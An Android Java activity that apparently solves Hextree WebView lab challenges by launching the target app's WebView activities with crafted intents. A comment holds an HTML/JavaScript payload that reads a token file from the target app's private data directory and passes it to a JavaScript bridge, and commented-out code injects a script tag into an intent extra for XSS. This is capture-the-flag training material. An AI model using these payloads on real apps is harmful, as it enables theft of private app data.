package io.hextree.webviews;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        // adb push exploit.html
        /*
       │ <html>
   2   │ <body>
   3   │ <script>
   4   │     var xhr = new XMLHttpRequest();
   5   │     xhr.onreadystatechange = function() {
   6   │         if (xhr.readyState === 4) {
   7   │             var token = xhr.responseText;
   8   │             console.log("Token: " + token);
   9   │             hextree.authCallback(token);
  10   │         }
  11   │     };
  12   │     xhr.open("GET", "file:///data/data/io.hextree.attacksurface/files/token.txt", true);
  13   │     xhr.send();
  14   │ </script>
  15   │ </body>
  16   │ </html>

         */
        findViewById(R.id.button).setOnClickListener(v -> {
                    Intent intent = new Intent();
                    // send the url to the file in files folder
                    intent.putExtra("URL", "");
                    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag41WebViewsActivity");
                    startActivity(intent);
//                    System.out.println("Button pressed");
                    // XSS scripting
//                     Intent intent = new Intent();
//                    intent.putExtra("NAME", "Jimmy </b> <script> window.hextree.success()</script> <b> Frades  ");
//                    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
//                    startActivity(intent);
        }
        );
    }
}